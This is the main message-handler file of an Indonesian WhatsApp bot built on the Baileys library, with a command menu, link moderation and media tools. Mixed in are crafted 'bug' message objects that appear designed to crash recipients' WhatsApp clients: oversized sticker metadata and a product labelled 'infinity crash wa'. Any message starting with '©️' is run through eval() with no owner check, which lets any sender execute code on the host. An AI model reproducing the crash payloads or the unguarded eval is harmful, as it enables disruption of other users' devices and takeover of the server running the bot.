require('./config')
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType } = global.baileys
const fs = require('fs')
const util = require('util')
let fetch = require('node-fetch');
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const moment = require('moment-timezone')
const yts = require('yt-search')
const { JSDOM } = require('jsdom')
const { color, bgcolor } = require('./lib/color')
const maker = require('mumaker')
const textpro = require('./lib/textpro')
const { tizi } = require('./lib/tizi');
const { weg } = require('./lib/weg');
const { vapi } = require('./lib/vapi.js');
const { philips } = require('./lib/philips.js');
const { apikey } = require('./apikey.json')
const { uptotelegra } = require('./lib/upload')
const { Primbon } = require('scrape-primbon')
const speed = require('performance-now')
const path = require('path')
const primbon = new Primbon()
const { Configuration, OpenAIApi } = require('openai')
const { exec, spawn, execSync } = require("child_process")
const { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
const { smsg, formatp, hitungmundur, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./lib/myfunc')
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
const { fetchBuffer, buffergif } = require("./lib/myfunc2")

const prem = JSON.parse(fs.readFileSync('./database/premium.json'))
const owner = JSON.parse(fs.readFileSync('./database/owner.json'))
const vnnye = JSON.parse(fs.readFileSync('./database/vnadd.json'))
const pengguna = JSON.parse(fs.readFileSync('./database/user.json'))
const docunye = JSON.parse(fs.readFileSync('./database/docu.json'))
const zipnye = JSON.parse(fs.readFileSync('./database/zip.json'))
const apknye = JSON.parse(fs.readFileSync('./database/apk.json'))
const ntilink = JSON.parse(fs.readFileSync("./lib/antilink.json"))
const ntilinkall =JSON.parse(fs.readFileSync('./lib/antilinkall.json'))
let ntilinkig =JSON.parse(fs.readFileSync('./database/antilinkinstagram.json'));
let ntilinkchannel =JSON.parse(fs.readFileSync('./database/antilinkchannelwa.json'));
const banned = JSON.parse(fs.readFileSync('./database/banned.json'))
const thumb = fs.readFileSync(`./image/lol.jpg`)
const virusgambar = fs.readFileSync(`./image/virgam.jpeg`)


module.exports = conn = async (conn, m, chatUpdate, store) => {
 try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype === 'messageContextInfo') ? (m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix


const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()//Kalau mau Single prefix Lu ganti pake ini = const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await conn.decodeJid(conn.user.id)
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const text = q = args.join(" ")
const { type, quotedMsg, mentioned, now, fromMe } = m
const { chats } = m
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const isMedia = /image|video|sticker|audio/.test(mime)
const isPrem = prem.includes(m.sender)
const from = mek.key.remoteJid
const groupMetadata = m.isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const welcm = m.isGroup ? wlcm.includes(from) : false
const welcmm = m.isGroup ? wlcmm.includes(from) : false
const AntiLink = m.isGroup ? ntilink.includes(from) : true
const AntiLinkAll = m.isGroup ? ntilinkall.includes(from) : false
const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(from) : false
const AntiLinkChannel = m.isGroup ? ntilinkchannel.includes(from) : true
const isBan = banned.includes(m.sender)
const content = JSON.stringify(m.message)
const numberQuery = text.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"
const mentionByTag = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
const Input = mentionByTag[0] ? mentionByTag[0] : q ? numberQuery : false
const wita = moment(Date.now()).tz('Asia/Makassar').locale('id').format('HH:mm:ss z')
const wit = moment(Date.now()).tz('Asia/Jayapura').locale('id').format('HH:mm:ss z')
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const tanggal = moment(Date.now()).tz("Asia/Makassar").locale('id').format("dddd, ll")
const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
const qtod = m.quoted? "true":"false"
const vn = true
const timestampi = speed();
const latensii = speed() - timestampi
const ini_mark = `0@s.whatsapp.net`
const dnew = new Date(Date.now())
const week = dnew.toLocaleDateString('in', {
               weekday: 'long'
            })
            const weton = ['Pahing', 'Pon', 'Wage', 'Kliwon', 'Legi'][Math.floor(dnew / 84600000) % 5]
            const date = dnew.toLocaleDateString('in', {
               day: 'numeric',
               month: 'long',
               year: 'numeric'
            })
            const dateIslamic = Intl.DateTimeFormat('in' + '-TN-u-ca-islamic', {
               day: 'numeric',
               month: 'long',
               year: 'numeric'
            }).format(dnew)
const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')
         if(time2 < "23:59:00"){
var shinchantime = `Selamat Malam 🌌`
 }
 if(time2 < "19:00:00"){
var shinchantime = `Selamat Malam 🌃`
 }
 if(time2 < "18:00:00"){
var shinchantime = `Selamat Sore 🌃`
 }
 if(time2 < "15:00:00"){
var shinchantime = `Selamat Sore 🌅`
 }
 if(time2 < "11:00:00"){
var shinchantime = `Siang  🌄`
 }
 if(time2 < "05:00:00"){
var shinchantime = `Selamat Pagi 🌄`
 } 
//fake quoted
const ftroli = {
         key: {
            fromMe: false,
            "participant": "0@s.whatsapp.net",
            "remoteJid": "status@broadcast"
         },
         "message": {
            orderMessage: {
               itemCount: 7777777,
               status: 200,
               surface: 200,
               message: `© ${ownername}`,
               orderTitle: 'memek',
               sellerJid: '0@s.whatsapp.net'
            }
         },
         contextInfo: {
            "forwardingScore": 999,
            "isForwarded": true
         },
         sendEphemeral: true
      }
const fkontak = {
         key: {
            participant: `0@s.whatsapp.net`,
            ...(from ? {
               remoteJid: `status@broadcast`
            } : {})
         },
         message: {
            'contactMessage': {
               'displayName': `${pushname}`,
               'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
               'jpegThumbnail': thumb,
               thumbnail: thumb,
               sendEphemeral: true
            }
         }
      }
      const fbugstik = {
key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/AnrD-A1QmqzujA1cup-mlu8IZA25t9JgmpQepFY9Rn6z.enc'",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 999999999,
"width": 999999999,
"directPath": "/v/t62.15575-24/30929805_648615486894459_9146693700573396349_n.enc?ccb=11-4&oh=01_AVwP9-aotKL3M5xo84ruYmFJof6hpjvTaHtWrOLdvzhkxw&oe=632E77C8",
"fileLength": "999999999",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}
}
}
const fbugtoko = {
key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
"productMessage": {
"product": {
"productImage":{
"mimetype": "image/jpeg",
"jpegThumbnail": thumb //Gambarnye
},
"title": `👿ᴬᵗᵗᵃᶜᵏᵉʳ ᵂʰᵃᵗˢᴬᵖᵖ👿`, //Kasih namalu 
"description": "⫹⫺ sʜɪɴᴄʜᴀɴ-ɪɴꜰɪɴɪᴛʏ-ᴄʀᴀꜱʜ-ᴡᴀ", 
"retailerId": "XD",
"productImageCount": 999999999
},
"businessOwnerJid": `0@s.whatsapp.net`
}
}
}
const fbugtext = {
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: {
        "extendedTextMessage": {
        "text": `${weg}\n${weg}`
        }
        }
        }
const blue = { 
key: {
            fromMe: false,
            "participant": "0@s.whatsapp.net",
            "remoteJid": "status@broadcast"
         },
'message': {
"interactiveMessage": {
"body": {
"text": `${ownername}`,
"hasMediaAttachment": [],
"jpegThumbnail": thumb,
},
"nativeFlowMessage": {
"buttons": [
				{
"name": "review_and_pay",
"buttonParamsJson": '{"currency":"IDR","total_amount":{"value":2023,"offset":100},"reference_id": "6348642505244872","order":{"status": "completed","items":[{"retailer_id": "6348642505244872","name": "","amount":{"value":10000,"offset":100},"quantity":7777777}]}}'
}
]
}
}}}
const fpayment = {
         key: {
            fromMe: false,
            "participant": "0@s.whatsapp.net",
            "remoteJid": "status@broadcast"
         },
         message: {
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "10000000000",
"requestFrom": m.sender,
"noteMessage": {
"extendedTextMessage": {
"text": `𝙎𝙃𝙄𝙉𝘾𝙃𝘼𝙉 メ 𝙒𝙄𝘽𝙐𝙎𝙊𝙁𝙏`,
}
}}}}
const shinuwu = { 
key: {
fromMe: false,
            participant: m.chat,
            ...(from ? {
               remoteJid: `0@s.whatsapp.net`
            } : {})
         },
         message: {
"interactiveMessage": {
"body": {
"text": `${ownername}`,
"hasMediaAttachment": [],
"jpegThumbnail": thumb,
},
"nativeFlowMessage": {
"buttons": [
				{
"name": "review_and_pay",
"buttonParamsJson": '{"currency":"IDR","total_amount":{"value":2023,"offset":100},"reference_id": "6348642505244872","order":{"status": "completed","items":[{"retailer_id": "6348642505244872","name": "","amount":{"value":10000,"offset":100},"quantity":7777777}]}}',
mentions: []
}
]
}
}}}
//===================SHINCHAN XD=========================//
if (vn) {
let allct = await store.chats.all().map(v => v.id)
if (m.message && m) {
if (vn === false) return
for (let jid of allct) {
conn.sendPresenceUpdate('composing', jid)
}
}
}
//===================SHINCHAN XD=========================//
const paycall = (teks) => {
var scheduledCallCreationMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": 'call',
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": `${teks}`,
}
}), { userJid: m.chat, quoted: m })
conn.relayMessage(m.chat, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
}
const paytod = (teks) => {
let me = m.sender
var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "INR",
"amount1000": "10000000000",
"requestFrom": m.sender,
"noteMessage": {
"extendedTextMessage": {
"text": `${teks}`,
}
}}}), { userJid: m.chat, quoted: fkontak })
conn.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
const reply = (teks) => {
return conn.sendMessage(m.chat, { caption: teks, document: fs.readFileSync('./image/cheems.xlsx'), mimetype: `${docs}`, fileName: `𝙏𝙐𝙉𝙂𝙂𝙐 𝙔𝘼🤗`,
                contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        containsAutoReply: true,
                        title: `*Hay ${pushname} 👋* ${shinchantime}\n📌RUNTIME : ${runtime(process.uptime())}`,
                        body: `${tanggal} ××× ${time}`,
                        mediaType: 1,
                        previewType: 0,
                        renderLargerThumbnail: true,
                        thumbnailUrl: 'https://telegra.ph/file/8cd68dfc3fa902010e0e6.jpg',
                        thumbnail: thumb,
                        sourceUrl: 'https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ'
                    }}}, { quoted: blue})}
const replybrainly = (teks) => {
return conn.sendMessage(m.chat, { caption: teks, document: fs.readFileSync('./image/cheems.xlsx'), mimetype: `${docs}`, fileName: `𝘽𝙍𝘼𝙄𝙉𝙇𝙔📖`,
                contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        containsAutoReply: true,
                        title: `*Hay ${pushname} 👋* ${shinchantime}\n📌RUNTIME : ${runtime(process.uptime())}`,
                        body: `${tanggal} ××× ${time}`,
                        mediaType: 1,
                        previewType: 0,
                        renderLargerThumbnail: true,
                        thumbnailUrl: 'https://telegra.ph/file/8cd68dfc3fa902010e0e6.jpg',
                        thumbnail: thumb,
                        sourceUrl: 'https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ'
                    }}}, { quoted: blue})}
const replyhentai = (teks) => {
return conn.sendMessage(m.chat, { caption: teks, document: fs.readFileSync('./image/cheems.xlsx'), mimetype: `${docs}`, fileName: `🥵𝙉𝙃𝙀𝙉𝙏𝘼𝙄 𝙎𝙀𝘼𝙍𝘾𝙃🥵`,
                contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        containsAutoReply: true,
                        title: `*Hay ${pushname} 👋* ${shinchantime}\n📌RUNTIME : ${runtime(process.uptime())}`,
                        body: `${tanggal} ××× ${time}`,
                        mediaType: 1,
                        previewType: 0,
                        renderLargerThumbnail: true,
                        thumbnailUrl: 'https://telegra.ph/file/b2d62575b1b5cadaeb1e2.jpg',
                        thumbnail: thumb,
                        sourceUrl: 'https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ'
                    }}}, { quoted: blue})}
const replyerror = (teks) => {
return conn.sendMessage(m.chat, { caption: teks, document: fs.readFileSync('./image/cheems.xlsx'), mimetype: `${docs}`, fileName: `𝙔𝘼𝙃 𝙀𝙍𝙍𝙊𝙍😭`,
                contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        containsAutoReply: true,
                        title: `𝙀𝙍𝙍𝙊𝙍 404 𝘽𝙔: ${global.ownername}`,
                        body: `${tanggal} ××× ${time}`,
                        mediaType: 1,
                        previewType: 0,
                        renderLargerThumbnail: true,
                        thumbnailUrl: 'https://telegra.ph/file/39ebef0bfdf46f18cb2ff.png',
                        thumbnail: thumb,
                        sourceUrl: 'https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ'
                    }}}, { quoted: blue})} 
const ytreply = (teks) => {
return conn.sendMessage(m.chat, { caption: teks, document: fs.readFileSync('./image/cheems.xlsx'), mimetype: `${docs}`, fileName: `🐼𝙔𝙊𝙐𝙏𝙐𝘽𝙀 𝙎𝙀𝘼𝙍𝘾𝙃🐼`,
                contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        containsAutoReply: true,
                        title: `*Hay ${pushname} 👋* ${shinchantime}\n📌RUNTIME : ${runtime(process.uptime())}`,
                        body: `${tanggal} ××× ${time}`,
                        mediaType: 1,
                        previewType: 0,
                        renderLargerThumbnail: true,
                        thumbnailUrl: 'https://telegra.ph/file/97f426edef5a6326065a9.jpg',
                        thumbnail: thumb,
                        sourceUrl: 'https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ'
                    }}}, { quoted: blue})} 
const spotifyreply = (teks) => {
return conn.sendMessage(m.chat, { caption: teks, document: fs.readFileSync('./image/cheems.xlsx'), mimetype: `${docs}`, fileName: `🐣𝙎𝙋𝙊𝙏𝙄𝙁𝙔 𝙎𝙀𝘼𝙍𝘾𝙃🐣`,
                contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        containsAutoReply: true,
                        title: `*Hay ${pushname} 👋* ${shinchantime}\n📌RUNTIME : ${runtime(process.uptime())}`,
                        body: `${tanggal} ××× ${time}`,
                        mediaType: 1,
                        previewType: 0,
                        renderLargerThumbnail: true,
                        thumbnailUrl: 'https://www.scdn.co/i/_global/open-graph-default.png',
                        thumbnail: thumb,
                        sourceUrl: 'https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ'
                    }}}, { quoted: blue})} 

const replybokep = (teks) => {
return conn.sendMessage(m.chat, { caption: teks, document: fs.readFileSync('./image/cheems.xlsx'), mimetype: `${docs}`, fileName: `🥵𝙓𝙉𝙓𝙓 𝙎𝙀𝘼𝙍𝘾𝙃🥵`,
                contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        containsAutoReply: true,
                        title: `*Hay ${pushname} 👋* ${shinchantime}\n📌RUNTIME : ${runtime(process.uptime())}`,
                        body: `${tanggal} ××× ${time}`,
                        mediaType: 1,
                        previewType: 0,
                        renderLargerThumbnail: true,
                        thumbnailUrl: 'https://telegra.ph/file/6bdd8ea22025d0afe0497.jpg',
                        thumbnail: thumb,
                        sourceUrl: 'https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ'
                    }}}, { quoted: blue})} 
                    
function pickRandom(list) {
return list[Math.floor(Math.random() * list.length)]
}
//document randomizer
let documents = [doc1,doc2,doc3,doc4,doc5,doc6]
let docs = pickRandom(documents)

stod = `${sender}`
var mundur = await hitungmundur(4, 23)
const menulist = `*Hay ${pushname} 👋*
${shinchantime}
Saya ©ɴᴇʀᴏʙᴏᴛ yang di buat oleh developer ${global.ownername} untuk membantu para pengguna WhatsApp
━━━━━━━━━━━━━━━━━━━
╰┈➤「 \`\`\`𝑫𝑨𝑻𝑨𝑩𝑨𝑺𝑬\`\`\` 」
━━━━━━━━━━━━━━━━━━━
_Status : ${isCreator ? 'Owner' : 'User'}_
_Nama : ${pushname}_
_Nomor : @${stod.split('@')[0]}_
_Sponsored :  @${ini_mark.split('@')[0]}_
Prefix :   ${prefix}
_Speed : ${latensii.toFixed(4)} Second_
Memory Used : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB
Hostname : ${os.hostname()}
Platform : ${os.platform()}
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝑹𝑬𝑨𝑳 𝑻𝑰𝑴𝑬 )
━━━━━━━━━━━━━━━━━━━
𝐇𝐚𝐫𝐢: ${week} ${weton}
𝐓𝐚𝐧𝐠𝐠𝐚𝐥: ${date}
𝐉𝐚𝐦: ${time}
𝐉𝐚𝐦: ${wita}
𝐉𝐚𝐦: ${wit}
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝑰𝑫𝑼𝑳 𝑭𝑰𝑻𝑹𝑰 🌜 )
━━━━━━━━━━━━━━━━━━━
 ${mundur}
 Hijriah : ${dateIslamic}
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝘿𝙊𝙒𝙉𝙇𝙊𝘼𝘿 )
━━━━━━━━━━━━━━━━━━━
➤ pixivdl (perlu code pixiv)
➤ spotify (link Spotify)
➤ nhentai (code hentai)
➤ xnxx/xnxxdl (link bokep xnxx)
➤ tiktok (link)
➤ tiktokmp3 (link)
➤ tiktokslide/ttslide (link)
➤ igvid/igvideo (link video ig)
➤ igvid2 (Khusus Video Slide)
➤ igimg/igfoto (link foto ig)
➤ play (cari lagu apa?)
➤ ytmp3 (link yt)
➤ ytmp4 (link yt)
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝘼𝙄 & 𝙀𝙉𝘾𝙃𝘼𝙉𝙏 )
━━━━━━━━━━━━━━━━━━━
➤ ai/openai
➤ loli
➤ waifu
➤ remini (reply gambar)
➤ 4k (reply gambar)
➤ removebg (reply gambar)
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝙋𝙀𝙉𝘾𝘼𝙍𝙄𝘼𝙉 )
━━━━━━━━━━━━━━━━━━━
➤ spotifysearch (search)
➤ xnxxsearch (search)
➤ ytsearch (search)
➤ pinterest (search)
➤ wallpaper (search)
➤ wallpaper2
➤ carihentai (Lu mo nyari apa?)
➤ anime (Cari Sinopsis Anime)
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝘼𝙇𝘼𝙏 𝘽𝘼𝙉𝙏𝙐 )
━━━━━━━━━━━━━━━━━━━
➤ aksarajawa
➤ latin (translate aksara jawa)
➤ lens / googlelens
➤ brainly (Kirim Soal)
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝙎𝙏𝙄𝙆𝙀𝙍 )
━━━━━━━━━━━━━━━━━━━
➤ ttp
➤ ttp2
➤ ttp3
➤ ttp4
➤ attp
➤ sticker
➤ qc (Masukan Teks)
➤ smeme (reply gambar)
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝘾𝙊𝙉𝙑𝙀𝙍𝙏 )
━━━━━━━━━━━━━━━━━━━
➤ toimg
➤ take/wm
➤ toaudio
➤ tomp3
➤ togif
➤ tovn
━━━━━━━━━━━━━━━━━━━
╰┈➤( 𝘽𝙔𝙋𝘼𝙎𝙎 𝙄𝙆𝙇𝘼𝙉 )
━━━━━━━━━━━━━━━━━━━
➤ bypassouo (anti iklan boss)
➤ bypassmirror (langsung ke inti)
━━━━━━━━━━━━━━━━━━━
➤ nsfwmenu (18+)
➤ grupmenu (Owner)
➤ bugmenu (Owner)
➤ tqto (Thanks)
━━━━━━━━━━━━━━━
`

// DELAY FUNCTION
function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
async function replyprem(teks) {
    reply(`Fitur ini untuk pengguna premium, hubungi pemilik untuk menjadi pengguna premium`)
}
async function loading () {
var shinchanehe = [
"▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 10%",
"████▓▓▓▓▓▓▓▓▓▓ 30%",
"████████▓▓▓▓▓▓ 50%",
"████████████▓▓ 80%",
"██████████████ 100%",
"Loading Completed!"
]
let { key } = await conn.sendMessage(from, {text: 'Loading...'})//Pengalih isu

for (let i = 0; i < shinchanehe.length; i++) {
/*await delay(10)*/
a = await conn.sendMessage(from, {text: shinchanehe[i], edit: key });//PESAN LEPAS
}
}

//auto restart bot
function start() {
   let args = [path.join(__dirname, 'shinchan.js'), ...process.argv.slice(2)]
   console.log([process.argv[0], ...args].join('\n'))
   let p = spawn(process.argv[0], args, {
         stdio: ['inherit', 'inherit', 'inherit', 'ipc']
      })
      .on('message', data => {
         if (data == 'reset') {
            console.log('Restarting Bot...')
            p.kill()
            start()
            delete p
         }
      })
      .on('exit', code => {
         console.error('Exited with code:', code)
         if (code == '.' || code == 1 || code == 0) start()
      })
}
//auto off
if (global.autoOff) {
if (command) {
conn.sendPresenceUpdate('unavailable', from)
}
}
//auto typing
if (global.autoTyping) {
if (command) {
conn.sendPresenceUpdate('composing', from)
}
}
//auto recording
if (global.autoRecord) {
if (command) {
conn.sendPresenceUpdate('recording', from)
}
}
//auto reading
if (global.autoReading) {
if (command) {
conn.readMessages([m.key])
}
}
// itunya
      if (!conn.public) {
         if (!m.key.fromMe && !isCreator) return
      }
      if (m.mtype == 'viewOnceMessage' && m.msg.viewOnce) {
         try {
            await conn.ev.emit("viewOnceMessage", m);
         } catch (err) {
            console.error(util.format(err))
         }
      }
/*let rn = ['recording']
let jd = rn[Math.floor(Math.random() * rn.length)];
if (m.message) {
conn.sendPresenceUpdate(jd, from)
console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', from))
}*/
//Grup Only By ShinChan_Kawaii
if(isCmd && !m.isGroup && !isCreator && grup_only){
          paycall("Bot hanya bisa digunakan dalam grup")
          return
        }
// Anti Link
if (AntiLink) {
if (body.match(/(chat.whatsapp.com\/)/gi)) {
if (!isBotAdmins) return m.reply(`${mess.botAdmin}, _Untuk menendang orang yang mengirim link group_`)
let gclink = (`https://chat.whatsapp.com/`+await conn.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return conn.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAnda tidak akan ditendang oleh bot karena yang Anda kirim adalah link ke grup ini`})
if (isAdmins) return conn.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAdmin sudah mengirimkan link, admin bebas memposting link apapun`})
if (isCreator) return conn.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\Owner telah mengirim link, owner bebas memposting link apa pun`})
await conn.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
conn.sendMessage(from, {text:`\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Jangan kirim group link di group ini`, contextInfo:{mentionedJid:[sender]}}, {quoted:m})
}
}

//antilink all by ShinChan
if (AntiLinkAll)
   if (budy.match("https://")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin sudah kirim linknya, admin bebas kirim link apapun😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
await conn.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
id: mek.key.id,
participant: mek.key.participant
}
})
conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
conn.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Has been kicked because of sending link in this group`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink Instagram
if (AntiLinkInstagram)
   if (budy.includes("https://www.instagram.com/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Instagram Link Detected 」\`\`\`\n\nAdmin sudah mengirimkan link instagram, admin bebas mengirimkan link apa saja😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await conn.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
conn.sendMessage(from, {text:`\`\`\`「 Instagram Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Telah ditendang karena mengirimkan link instagram di grup ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink Channel Wa by ShinChan
if (AntiLinkChannel)
   if (budy.includes("https://whatsapp.com/channel/")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Saluran WhatsApp Link Detected 」\`\`\`\n\nAdmin sudah mengirimkan link Saluran WhatsApp, admin bebas mengirimkan link apapun😇`
if (isAdmins) return m.reply(bvl)
if (m.key.fromMe) return m.reply(bvl)
if (isCreator) return m.reply(bvl)
        await conn.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
conn.sendMessage(from, {text:`\`\`\`「 Saluran WhatsApp Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} Telah ditendang karena mengirimkan link Saluran di grup ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(from, { text: text, mentions: mentionedJid }, {
userJid: conn.user.id,
quoted : m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, conn.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
conn.ev.emit('messages.upsert', msg)
}

if (budy.startsWith('©️')) {
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(e)
}
}

//HD FUNCTION
async function processing(urlPath, method) {
	return new Promise(async (resolve, reject) => {
		let Methods = ["enhance", "recolor", "dehaze"];
